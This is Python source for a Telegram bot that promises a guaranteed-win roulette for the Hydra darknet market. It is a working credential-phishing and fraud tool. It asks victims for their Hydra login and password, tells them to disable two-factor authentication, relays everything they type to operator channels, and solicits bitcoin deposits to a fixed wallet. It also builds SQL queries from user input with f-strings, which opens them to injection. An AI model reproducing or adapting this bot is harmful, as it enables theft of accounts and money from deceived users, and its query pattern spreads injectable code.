from os import link
from pickle import NONE
from tkinter.tix import TEXT
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.dispatcher.filters import Text
from aiohttp import Payload
import keyboards as nav

import logging

import sqlite3

import asyncio # асинхронка для поздних логов

from config import TOKEN

# рефералка
from aiogram.utils.deep_linking import get_start_link, decode_payload
from aiogram import types

# счетчик
from collections import Counter

from config import TOKEN, CHANNEL_ID_ADM, CHANNEL_ID_NEED_ADM

CHANNEL_ID = '-1001539650256' # айди канала для всех логов 
CHANNEL_ID_NEED = '-1001550195051' # айди канала где чистые логи без кнопок

# Пишу для логирования в терминале, чтобы понять где мои ебаные ошибки
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)


#base = sqlite3.connect('data.db') # создание подключения
#cur = conn.cursor('') # cur для взаимодействия с бд
#cur.execute('CREATE TABLE users(user_id INTEGER, username TEXT)') # добавил строку
def sql_start():
    global base, cur
    base = sqlite3.connect('data.db')
    cur = base.cursor()
    if base:
        print('База данных существует или успешно создана')
    else:
        print('бля нихуя')
    base.execute('CREATE TABLE IF NOT EXISTS users(user_id INTEGER PRIMARY KEY NOT NULL, link TEXT INTEGER, ref_manager TEXT INTEGER, referals INTEGER)')
    base.commit()

sql_start() # запускаем функцию с БД

# добавляю юзера в бд при /start
@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    
    ref_link = await get_start_link(str(message.from_user.id), encode=True) # создаю ссылку
    args = message.get_args() # тут содержится зашифрованный id, который является частью реферальной ссылки
    reference = decode_payload(args) # расшифровка id
    print(ref_link)
    print(args)
    print(len(args))

    await message.reply('{user}'.format(user=message.from_user.full_name) + ", добро пожаловать в победоносный бот!\n⚡️Здесь выигрывают 100% даже с 1 фишкой рулетки hydra\n⚡️1 прокрутка рулетки позиции до 50000 рублей - бесплатно!\n⚡️Любые доступные города!", reply_markup = nav.mainMenu)
    try:
        base = sqlite3.connect('data.db')
        cur = base.cursor()
        cur.execute(f'INSERT INTO "users" (user_id, link) VALUES ("{message.from_user.id}", "{ref_link}")')
        #cur.execute(f'UPDATE "users" SET user_id = "{message.from_user.id}" WHERE user_id = ""')
        base.commit()
    except Exception as e1:
        print(e1)
        base = sqlite3.connect('data.db')
        cur = base.cursor()
        cur.execute(f'INSERT INTO "users" (user_id, link) VALUES ("{message.from_user.id}", "{ref_link}")')
        #cur.execute(f'UPDATE "users" SET user_id = "{message.from_user.id}" WHERE user_id = ""')
        base.commit()    
    finally:
        # Проверка на наличие записи в ref_manager
        cur.execute(f'SELECT ref_manager FROM "users" WHERE user_id = "{message.from_user.id}"') # выбираю ref_manager и сравниваю значение с NULL
        base.commit()
        is_ref_manager = cur.fetchone() # вытаскиваю реф мэнэджэра в виде листа
        clean_ref_manager = is_ref_manager[0] # беру первый элемент списка
        print(clean_ref_manager, " реф менеджер")
    # СЧЕТЧИК
    #    i = 0
        if len(args) > 0: # Если длина payload у /start больше 0, то есть существует
            cur.execute('SELECT ref_manager FROM "users" WHERE ref_manager')
            base.commit()
            is_all_ref_managers = cur.fetchall() # вытаскиваю всех реф менеджеров в виде tuple
            Counter_all_ref_managers = Counter(is_all_ref_managers) # получаю словарь с ключами
            
            #print(Counter_all_ref_managers) # смотрю словарь, полученный выше
            #How_ref_managers = len(Counter_all_ref_managers) # считаю сколько реферальных менеджеров в словаре
            #print(How_ref_managers, " Сколько реферальных менеджеров в словаре") # смотрю сколько реферальных менеджеров в словаре
            #Last_index = How_ref_managers - 1
            #print(Last_index, " Последний индекс словаря")
            # расшифровка словаря по ключ:значение
            
            # ИЗВЛЕК с помощью запятой ебаный кортеж!
            for key, value in Counter_all_ref_managers.items():
                key, = key
                print(key,':',value) # если использовать * перед key, то кортеж распаковывается
                cur.execute(f'UPDATE "users" SET referals = "{value}" WHERE user_id = "{key}"')
                base.commit()
 
        if clean_ref_manager == None:
            cur.execute(f'UPDATE "users" SET ref_manager = "{reference}" WHERE user_id = "{message.from_user.id}"') # указываю кто пригласил 
            base.commit()
        else:
            print("Пользователь был приглашен другим реф менеджером или у /start нет параметра payload(нет реф менеджера)")

# Работа инлайн кнопки про рефералов
@dp.callback_query_handler()
async def process_callback_button1(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(callback_query.from_user.id, 'Вы получите бесплатную прокрутку за каждого приглашенного реферала, который прокрутит рулетку с помощью бота.\nТакже 10% с пополнений вашего реферала.\n')
# работа кнопок у юзеров

@dp.message_handler()
async def bot_message(message: types.Message):
    
    if message.text == '👤Профиль':
        
        cur.execute(f'SELECT link FROM "users" WHERE user_id = "{message.from_user.id}"') # запрос на получение ссылки из бд и сохранение в переменной
        record_link = cur.fetchone()
        cur.execute(f'SELECT referals FROM "users" WHERE user_id = "{message.from_user.id}"') # запрос на получение количества рефералов у юзера
        record_referals = cur.fetchone()
        # беру первое значение из листа(массива)
        clean_link = record_link[0]
        clean_referals = record_referals[0]

        await message.reply(f"\nВаше имя: {message.from_user.full_name}\nВаш баланс: 0 рублей\nБесплатная попытка: ✅\nВаши рефералы: {clean_referals}\nВаша реферальная ссылка:\n{clean_link}\nВаш id: {message.from_user.id}\nВаш ник: {message.from_user.username}\n", reply_markup=nav.inline_kb1)
    if message.text == '💰Баланс':
        await message.reply("✅Вам доступна 1 бесплатная прокрутка рулетки до 50000 рублей с 100% шансом выиграть.\n✅Войдите в аккаунт через кнопку.")
        await message.reply("💰Ваш баланс: 0 рублей\n💎Пополнить на этот bitcoin кошелек: 393o4b1eGmC8gVLxwJbzy27Snz7RSC1EkV")
    if message.text == '📝Цены':
        await message.reply("✅Вам доступна 1 бесплатная прокрутка рулетки до 50000 рублей с 100% шансом выиграть.\n✅Войдите в аккаунт через кнопку.")
        await message.reply("Прайс:\n⚡️Рулетка до 2500 рублей стоит 500 рублей.\n⚡️Рулетка от 2500 до 5000 стоит 1000 рублей.\n⚡️Насчет более крупных сумм уточняйте у поддержки.")
    if message.text == '✅Войти в аккаунт':
        await message.reply(
"📝Напишите в сообщение бота логин и пароль от сайта hydra, чтобы войти в аккаунт.\n⚙️Логин и пароль через пробел.\n⚙️Укажите номер рулетки через пробел после пароля\n❗️Напоминаем, что рулетку крутить можно на позиции до 50000 рублей!\n✉️После хэша через пробел можете указать свой ник телеграма @ для обратной связи")
        if message.from_user.id == 511883882:
            await asyncio.sleep(10)
            await message.reply("Ваше победное число: 39")
    if message.text == '👍🏻Поддержка':
        await message.reply("👤По всем вопросам обращайтесь сюда: \n⚙️@hydrasell")
    if message.text == '🔥Крутить':
        await message.reply("✅Войдите в аккаунт\n❌Недостаточно средств на балансе\n✅У вас есть бесплатная прокрутка рулетки 1 раз до 50000 рублей!\n⚠️Для бесплатной прокрутки требуется авторизация через аккаунт гидры.\n‼️ На аккаунте должна быть 1 завершенная сделка.")


    # пересылка без кнопок
    texted = message.text
    if texted == '🔥Крутить':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    elif texted == '👤Профиль':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    elif texted == '💰Баланс':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    elif texted == '👍🏻Поддержка':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    elif texted == '📝Цены':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    elif texted == '✅Войти в аккаунт':
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
    else:
        await bot.send_message(CHANNEL_ID_ADM, texted)
        await bot.send_message(CHANNEL_ID_NEED_ADM, texted)
        await message.reply("⚡️Ваши данные были приняты на проверку. Ожидайте...\n⚡️Если вы указали верные данные, то Вам придет сообщение от бота с цифрой для победы в рулетке в течение нескольких минут.\n⚡️Если бот не прислал число, значит бот не гарантирует 100% выигрыш.\n⚡️Рекомендуем Вам пополнить баланс своего аккаунта, чтобы повысить свои шансы на выигрыш.\n⚡️Также бот может не прислать число из-за проблемы со входом в аккаунт из-за гугл аутентификации.\n⚡️Просьба отключить гугл аутентификатор")
        await asyncio.sleep(600)
        await bot.send_message(CHANNEL_ID, texted)
        await bot.send_message(CHANNEL_ID_NEED, texted)    

# хендлер для создания ссылок 
#@dp.message_handler(commands=["ref"])
#async def get_ref(message: types.Message):
#   link = await get_start_link(str(message.from_user.username), encode=True)
#   result: 'https://t.me/MyBot?start='
#   после знака = будет закодированный никнейм юзера, который создал реф ссылку, вместо него можно вставить и его id 
#   await message.answer(f"Ваша реферальная ссылка {link}")


# хендлер для расшифровки ссылки
#@dp.message_handler(commands=["start"])
#async def handler(message: types.Message):
#    args = message.get_args()
#    reference = decode_payload(args)
#    await message.answer(f"Вас пригласил {reference}") #здесь в  reference должен быть юзернейм, того кто создал ссылку




#  поллинг = опрашиваю сервера телеграм о новых сообщениях?
if __name__ == '__main__':
    executor.start_polling(dp)